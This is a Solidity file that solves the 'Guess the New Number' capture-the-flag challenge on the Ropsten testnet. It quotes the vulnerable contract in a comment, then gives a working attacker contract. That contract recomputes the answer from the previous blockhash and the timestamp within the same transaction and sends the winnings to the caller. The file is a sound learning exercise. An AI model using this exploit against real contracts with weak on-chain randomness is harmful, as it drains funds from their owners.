//SPDX-License-Identifier: No-License

//Address of the contract on the ropsten network:
//0x9d3Db2B3EFAE979c2c722789972aCd973D8c4281

pragma solidity ^0.8.0;
/*
contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}*/

interface IGuessTheNewNumberChallenge{
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberSolution{
    IGuessTheNewNumberChallenge public deployedContract;
    address public owner;

    constructor(address _challengeAddress) {
        deployedContract = IGuessTheNewNumberChallenge(_challengeAddress);
    }

    receive() external payable{   
        }

    function tryToGuess() public payable{
        require(msg.value == 1 ether, "1 ETH needed");
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        deployedContract.guess{value: 1 ether}(answer);
        payable(msg.sender).transfer(address(this).balance);
    }
}
